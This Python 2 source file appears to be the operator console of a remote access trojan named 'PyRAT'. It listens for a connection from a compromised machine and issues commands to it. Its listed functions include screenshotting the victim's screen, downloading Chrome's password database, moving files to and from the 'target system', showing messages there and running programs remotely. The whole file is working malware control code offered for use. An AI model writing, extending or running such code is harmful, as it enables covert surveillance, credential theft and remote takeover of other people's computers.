#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
[~] Author : Black Viking
"""

END_OF_FILE = "(((END_OF_FILE)))"

import socket
import os
import sys
import base64
from colorama import init
from colorama import Fore, Back, Style
from time import *

reload(sys)
sys.setdefaultencoding("utf-8")

green = Fore.GREEN
yellow = Fore.YELLOW
red = Fore.RED
blue = Fore.CYAN
white = Fore.WHITE
bright = Style.BRIGHT

host = "127.0.0.1"
port = 8000

def crypt(TEXT, encode=True):
    if encode == True:
        return base64.b64encode(TEXT)
    else:
        return base64.b64decode(TEXT)

def logo():
    print bright +blue + """ 
$$$$$$$\            $$$$$$$\   $$$$$$\ $$$$$$$$\       
$$  __$$\           $$  __$$\ $$  __$$\\__$$  __|      
$$ |  $$ |$$\   $$\ $$ |  $$ |$$ /  $$ |  $$ |         
$$$$$$$  |$$ |  $$ |$$$$$$$  |$$$$$$$$ |  $$ |         
$$  ____/ $$ |  $$ |$$  __$$< $$  __$$ |  $$ |         
$$ |      $$ |  $$ |$$ |  $$ |$$ |  $$ |  $$ |         
$$ |      \$$$$$$$ |$$ |  $$ |$$ |  $$ |  $$ |         
\__|       \____$$ |\__|  \__|\__|  \__|  \__|         
          $$\   $$ |                                   
          \$$$$$$  |      github.com/blackvkng                           
           \______/                           
"""
	
    help()
    print bright + white + "="*80
    
def send(data):
    global pwd
    cli.sendall(crypt(data))
    pwd = crypt(cli.recv(1024), False)
    print(bright + blue + crypt(cli.recv(16384), False))

def upload(command):
    fileName = command.replace("upload ", "")
    try:
        f = open(fileName, 'rb')
        cli.sendall(crypt(command))
        l = f.read(1024)

        while l:
            cli.send(l)
            l = f.read(1024)
        f.close()
        cli.send(END_OF_FILE)
        print bright + yellow + crypt(cli.recv(1024), False)+"\n"
        menu()

    except IOError:
        print Fore.RED + "[!] File not found\n"


def download(command):
    cli.sendall(crypt(command))
    
    if "screenshot()" in command: 
        fileName = str(command.replace("screenshot() ", "").replace("download ", ""))
    else:
        fileName = str(command.replace("download ", ""))

    while True:
        l = cli.recv(1024)

        if l.startswith("File not found"):
            print Fore.RED + "[!] File not found\n"
            menu()

        elif l == "[!] This func, works only on Windows!\n":
            print bright + red + l
            menu()

        else:
	        f = open(fileName, 'wb')
	        while (l):
	            if l.endswith(END_OF_FILE):
	                if END_OF_FILE in l:
	                    l = l.replace(END_OF_FILE, "")
	                f.write(l)
	                break
	            else:
	                f.write(l)
	                l = cli.recv(1024)

	        print bright + yellow + "[+] Download complete!"
	        print bright + yellow + "[+] %s ==> %s\n"%(fileName, os.getcwd()+os.sep+fileName)
	        f.close()
	        break
	        menu()

def help():
    print Fore.YELLOW + """
Commands:
    help()                  : Show this message.
    screenshot()            : Take a screenshot on client and send image file to server.
    chrome_db               : Download Chrome's password database.
    download                : Download files from client.
    upload                  : Upload files to client from server.
    message TEXT            : Show messages on target system.
    info()                  : Show target system's info.
    execute PROGRAM ARGS    : Execute programs in a new process.

Execute programs on local machine:
    :dir ==> with ":"
    :cls
    :clear"""

def main():
    global s, cli, addr, hostname, pwd
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, port))
    s.listen(1)
    print bright + Fore.YELLOW + "[-] Listening on ==> %s:%s\n"%(host, str(port))
    cli, addr = s.accept()

    pwd = crypt(cli.recv(1024), False)
    hostname = crypt(cli.recv(1024), False)

def menu():
    while True:
        command = raw_input("%s[%s@%s]-[%s]~$ "%(bright + green, hostname, addr[0], pwd))
        if command == "help()":
            help()
            menu()

        elif ":" in command:
            command = command.replace(":", "")
            if command[:2].decode("utf-8") == 'cd':
                try:
                    os.chdir(command[3:].decode("utf-8"))
                    menu()
                except OSError:
                    print "%s: No such file or directory"%(command[3:])
                    menu()
                    
            else:
                os.system(command)
                menu()

        elif "upload" in command:
            upload(command)

        elif command == "screenshot()":
            command = "screenshot() download %s.png"%(str(strftime("%Y-%m-%d~%H.%M.%S", gmtime())))
            download(command)

        elif "download" in command:
            download(command)

        elif command == "chrome_db":
            download("download chrome_db")

        elif command == "": 
            command = " "

        else:
            send(command)
def start():
    while True:
        try:
            main()
            menu()
        except Exception as e:
	    print bright + Fore.RED + "Error:\n%s\n"%(e)
	    start()

if __name__ == "__main__":
    init(autoreset=True)
    logo()
    start()
